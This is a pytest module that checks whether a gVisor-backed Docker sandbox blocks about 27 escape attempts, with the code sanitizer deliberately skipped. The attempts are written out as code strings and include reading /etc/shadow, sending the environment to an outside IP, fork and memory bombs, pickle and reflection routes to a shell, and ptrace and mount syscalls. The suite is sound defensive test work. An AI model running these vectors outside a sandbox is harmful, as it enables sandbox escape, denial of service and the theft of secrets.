"""Red-team suite for the gVisor container boundary — Phase 5 / TD-5.

Fable Review/01_OPERATING_MANUAL.md §10's "Phase-5 acceptance" is specific:
a module with >=25 known escape vectors, all failing *in the container*
*even when the sanitizer is bypassed deliberately*, plus the docker run
flags asserted by parsing.

This is deliberately not testing the same thing tests/sandbox/test_sanitizer.py
already does. That module proves CodeSanitizer's static AST/regex checks
catch known-bad code *before* it runs. This module proves the opposite
failure mode: even if a piece of code slips past every static check (or
static checking is skipped entirely, which is exactly what happens here —
every vector below is handed straight to SandboxExecutor._execute_docker,
never through .sanitize()), the OS-level container configuration still
stops the actual damaging *outcome*. §10 says it plainly: "the container is
the boundary," and this file is what makes that a tested claim instead of
an assertion in prose.

Vector polarity (read carefully before adding a new vector): every script
below must be written so a BLOCKED attempt raises naturally (an unhandled
exception makes the container process exit non-zero, which SandboxResult
.success reflects as False) and a SUCCESSFUL (breach) attempt falls
through to a normal, silent, zero-exit ending. Several operations used
here do not raise on failure by themselves (os.system returns a status
code; Popen.wait() returns a return code; a raw ctypes syscall returns -1
and sets errno) -- for those, the script explicitly checks the outcome
and raises *only in the blocked/secure case*. Getting this backwards (e.g.
raising in the breach case "to flag it") silently inverts the test: it
would report PASS for a real container escape. This bit us once while
writing this file -- see git history for this module.

Gated on a real, working `--runtime=runsc` Docker runtime. There is no
meaningful fallback: skipping the sanitizer only matters if a real
container boundary exists to test instead, so on a machine without gVisor
(any local dev box, most CI runners without a dedicated setup step) this
whole module skips cleanly rather than either lying about coverage or
failing for an environment reason unrelated to the code.
"""

from __future__ import annotations

import subprocess
from unittest.mock import patch

import pytest

from autocarto.execution.sandbox import SandboxExecutor


def _gvisor_available() -> bool:
    try:
        result = subprocess.run(
            ["docker", "run", "--rm", "--runtime=runsc",
             "python:3.12-slim-bookworm", "true"],
            capture_output=True, text=True, timeout=30,
        )
        return result.returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        return False


_GVISOR_AVAILABLE = _gvisor_available()
_SKIP_REASON = "no working --runtime=runsc Docker runtime available"


# ── Escape vectors: (id, code) ──────────────────────────────────────────────
# Every `code` string runs completely unsanitized, directly against the
# real container -- ALLOWED_IMPORTS/CodeSanitizer are not in the loop.

_NETWORK_VECTORS = [
    (
        "tcp_connect_external",
        "import socket\n"
        "socket.create_connection(('8.8.8.8', 53), timeout=3)\n",
    ),
    (
        "tcp_connect_localhost",
        # Loopback must not be an accidental exception to --network=none.
        "import socket\n"
        "socket.create_connection(('127.0.0.1', 80), timeout=3)\n",
    ),
    (
        "udp_send_external",
        "import socket\n"
        "s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
        "s.sendto(b'x', ('8.8.8.8', 53))\n",
    ),
    (
        "dns_resolution",
        # With no network device, resolution itself should fail, not just
        # the subsequent connect.
        "import socket\n"
        "socket.gethostbyname('example.com')\n",
    ),
    (
        "http_request",
        "import urllib.request\n"
        "urllib.request.urlopen('http://example.com', timeout=3)\n",
    ),
]

_FILESYSTEM_VECTORS = [
    (
        "write_etc",
        "open('/etc/autocarto-escape-test', 'w').write('x')\n",
    ),
    (
        "write_usr_local",
        # Tampering with the installed package itself, not just scratch space.
        "open('/usr/local/lib/python3.12/site-packages/pwned', 'w').write('x')\n",
    ),
    (
        "write_readonly_workspace",
        # /workspace is the code's own mount -- read-only even to itself.
        "open('/workspace/escape.txt', 'w').write('x')\n",
    ),
    (
        "overwrite_own_source",
        "open('/workspace/exec.py', 'w').write('print(1)')\n",
    ),
    (
        "write_proc_sys",
        "open('/proc/sys/kernel/hostname', 'w').write('x')\n",
    ),
    (
        "tmp_exec_bit",
        # /tmp is writable but mounted noexec: the *write* succeeds (that's
        # fine, /tmp is meant to be writable) but *running* the dropped
        # file must fail.
        "import os, stat, subprocess\n"
        "path = '/tmp/escape_bin'\n"
        "with open(path, 'w') as f:\n"
        "    f.write('#!/bin/true\\n')\n"
        "os.chmod(path, stat.S_IRWXU)\n"
        "subprocess.run([path], check=True)\n",
    ),
    (
        "tmpfs_fill_beyond_quota",
        # --tmpfs size=100m: writing well past that in a bounded number of
        # iterations must hit ENOSPC, not silently succeed.
        "chunk = b'0' * (10 * 1024 * 1024)\n"
        "with open('/tmp/fill', 'wb') as f:\n"
        "    for _ in range(20):\n"
        "        f.write(chunk)\n",
    ),
]

_PROCESS_PRIVILEGE_VECTORS = [
    (
        "shell_via_os_system",
        # No shell exists in the image (Dockerfile.sandbox removes
        # /bin/sh et al.), so os.system's implicit `/bin/sh -c ...` must
        # fail to even launch. os.system doesn't raise on failure, so the
        # blocked case is checked explicitly and raised.
        "import os\n"
        "rc = os.system('id > /tmp/whoami_out 2>&1')\n"
        "if rc != 0:\n"
        "    raise OSError(f'blocked as expected (rc={rc}), no shell available')\n",
    ),
    (
        "subprocess_direct_exec_shadow",
        # /bin/cat itself is present (only shells were removed) -- the
        # control here is Unix file permissions on /etc/shadow, not a
        # missing binary.
        "import subprocess\n"
        "subprocess.run(['/bin/cat', '/etc/shadow'], check=True)\n",
    ),
    (
        "setuid_root",
        "import os\n"
        "os.setuid(0)\n",
    ),
    (
        "read_shadow_directly",
        "open('/etc/shadow').read()\n",
    ),
    (
        "docker_socket_connect",
        # Confirms the docker socket was never (accidentally) mounted --
        # a real container-breakout vector if it had been.
        "import socket\n"
        "s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n"
        "s.connect('/var/run/docker.sock')\n",
    ),
    (
        "cgroup_procs_write",
        "open('/sys/fs/cgroup/cgroup.procs', 'w').write(str(1))\n",
    ),
]

_RESOURCE_VECTORS = [
    (
        "fork_bomb",
        # --pids-limit=64: os.fork() must raise (EAGAIN) well before 1000
        # iterations. No trailing raise on the "completed all 1000"
        # branch -- that would make a real breach exit non-zero too and
        # silently invert this test (see module docstring).
        "import os\n"
        "count = 0\n"
        "for _ in range(1000):\n"
        "    pid = os.fork()\n"
        "    if pid == 0:\n"
        "        os._exit(0)\n"
        "    count += 1\n"
        "print(f'fork bomb reached {count} forks unimpeded')\n",
    ),
    (
        "memory_bomb",
        # --memory=512m/--memory-swap=512m: the OOM killer should SIGKILL
        # the process well before 40GB is resident, which surfaces as a
        # non-zero/negative return code with no Python exception involved
        # at all -- again, no trailing raise on the "completed" branch.
        "chunks = []\n"
        "for _ in range(4096):\n"
        "    chunks.append(bytearray(10 * 1024 * 1024))  # 10MB * 4096 = 40GB\n"
        "print('allocated 40GB unimpeded')\n",
    ),
]

_REFLECTION_VECTORS = [
    (
        "subclasses_walk_to_popen",
        # Bypasses ever writing `import subprocess` -- proves
        # ALLOWED_IMPORTS enforcement isn't what's protecting the
        # container (it isn't even consulted on this path); the
        # container's own controls have to be what stops the spawn.
        # Popen.wait() returns a code rather than raising, so the blocked
        # case is checked and raised explicitly.
        "popen_cls = next(\n"
        "    c for c in ().__class__.__base__.__subclasses__()\n"
        "    if c.__name__ == 'Popen'\n"
        ")\n"
        "proc = popen_cls(['/bin/cat', '/etc/shadow'], stdout=-1, stderr=-1)\n"
        "proc.wait()\n"
        "if proc.returncode != 0:\n"
        "    raise PermissionError(f'blocked as expected, exit {proc.returncode}')\n",
    ),
    (
        "traceback_frame_to_os_module",
        # Reaches the os module via exception-frame traversal rather than
        # a direct import, then uses it for an action (remove a file on
        # the read-only root fs) that raises naturally when blocked.
        "try:\n"
        "    raise ValueError('x')\n"
        "except ValueError as e:\n"
        "    g = e.__traceback__.tb_frame.f_globals\n"
        "    os_mod = g.get('os')\n"
        "    if os_mod is None:\n"
        "        import os as os_mod\n"
        "    os_mod.remove('/etc/hostname')\n",
    ),
    (
        "environ_exfiltration_attempt",
        # Reads the container's own environment and tries to phone it
        # home; the network leg is what must fail.
        "import os, socket\n"
        "payload = repr(dict(os.environ)).encode()\n"
        "s = socket.create_connection(('8.8.8.8', 80), timeout=3)\n"
        "s.sendall(payload)\n",
    ),
    (
        "pickle_reduce_to_shell",
        # Classic deserialization-style escape shape: __reduce__
        # smuggling a shell command via pickle round-trip rather than an
        # explicit os.system call in the source text.
        "import pickle, os\n"
        "def _run_and_check():\n"
        "    rc = os.system('id > /tmp/via_pickle 2>&1')\n"
        "    if rc != 0:\n"
        "        raise OSError(f'blocked as expected (rc={rc})')\n"
        "class Evil:\n"
        "    def __reduce__(self):\n"
        "        return (_run_and_check, ())\n"
        "pickle.loads(pickle.dumps(Evil()))\n",
    ),
]

_SYSCALL_VECTORS = [
    (
        "ptrace_attach",
        # A direct, unfiltered libc syscall via ctypes -- entirely outside
        # anything a sanitizer could catch by pattern-matching Python
        # source. gVisor intercepting/rejecting this at the sentry is
        # exactly the class of protection --runtime=runsc is for.
        "import ctypes\n"
        "libc = ctypes.CDLL('libc.so.6', use_errno=True)\n"
        "ret = libc.ptrace(16, 1, None, None)  # PTRACE_ATTACH on pid 1\n"
        "if ret != 0:\n"
        "    raise OSError(ctypes.get_errno(), 'ptrace blocked as expected')\n"
        "print('ptrace attach succeeded (breach)')\n",
    ),
    (
        "mount_remount_root",
        "import ctypes\n"
        "libc = ctypes.CDLL('libc.so.6', use_errno=True)\n"
        "ret = libc.mount(b'none', b'/', None, 0, None)\n"
        "if ret != 0:\n"
        "    raise OSError(ctypes.get_errno(), 'mount blocked as expected')\n"
        "print('mount succeeded (breach)')\n",
    ),
    (
        "chroot_escape_attempt",
        "import ctypes\n"
        "libc = ctypes.CDLL('libc.so.6', use_errno=True)\n"
        "ret = libc.chroot(b'/tmp')\n"
        "if ret != 0:\n"
        "    raise OSError(ctypes.get_errno(), 'chroot blocked as expected')\n"
        "print('chroot succeeded (breach)')\n",
    ),
]

ALL_VECTORS = (
    _NETWORK_VECTORS + _FILESYSTEM_VECTORS + _PROCESS_PRIVILEGE_VECTORS
    + _RESOURCE_VECTORS + _REFLECTION_VECTORS + _SYSCALL_VECTORS
)


def test_vector_count_meets_phase5_acceptance_bar():
    """Manual §10's acceptance bar is >=25 vectors; pin it so the suite
    can't quietly shrink back under that bar in a future edit."""
    assert len(ALL_VECTORS) >= 25, (
        f"only {len(ALL_VECTORS)} escape vectors defined; Phase 5's "
        "acceptance criterion requires >=25"
    )


@pytest.mark.skipif(not _GVISOR_AVAILABLE, reason=_SKIP_REASON)
@pytest.mark.parametrize(
    "vector_id,code", ALL_VECTORS, ids=[v[0] for v in ALL_VECTORS],
)
def test_escape_vector_fails_in_container(vector_id: str, code: str):
    executor = SandboxExecutor(backend="docker")
    # Deliberately bypassing .execute()/CodeSanitizer.sanitize() -- calling
    # _execute_docker directly, per §10's "even when the sanitizer is
    # bypassed" requirement.
    result = executor._execute_docker(code)
    assert result.success is False, (
        f"escape vector {vector_id!r} SUCCEEDED inside the container "
        f"(stdout={result.stdout!r}, stderr={result.stderr!r})"
    )


# ── docker run flags: asserted by parsing, no Docker/gVisor required ────────

def test_docker_run_command_carries_required_isolation_flags():
    """§10's second acceptance clause: the flags themselves are asserted by
    parsing the constructed command, not inferred from a successful run.
    Runs unconditionally (mocks subprocess.run) so it catches a regression
    in _execute_docker's command construction on every CI leg, not only the
    dedicated gVisor job."""
    captured: dict = {}

    def _fake_run(cmd, **kwargs):
        captured["cmd"] = cmd
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    with patch("subprocess.run", side_effect=_fake_run):
        SandboxExecutor(backend="docker").execute("print(1)\n")

    cmd = captured.get("cmd")
    assert cmd is not None, "subprocess.run was never called"
    assert "--runtime=runsc" in cmd
    assert "--network=none" in cmd
    assert "--cap-drop=ALL" in cmd
    assert "--read-only" in cmd
    assert "--security-opt=no-new-privileges" in cmd
    assert "--pids-limit=64" in cmd
    assert cmd[0:2] == ["docker", "run"]
    assert cmd[-3] == "autocarto-sandbox:latest"
    assert cmd[-2:] == ["python", "/workspace/exec.py"]


def test_docker_run_command_never_grants_new_privileges_without_cap_drop():
    """Guards against a future edit that adds one flag but silently drops
    the other -- no-new-privileges alone is insufficient without cap-drop,
    and vice versa."""
    captured: dict = {}

    def _fake_run(cmd, **kwargs):
        captured["cmd"] = cmd
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    with patch("subprocess.run", side_effect=_fake_run):
        SandboxExecutor(backend="docker").execute("print(1)\n")

    cmd = captured["cmd"]
    assert "--security-opt=no-new-privileges" in cmd and "--cap-drop=ALL" in cmd
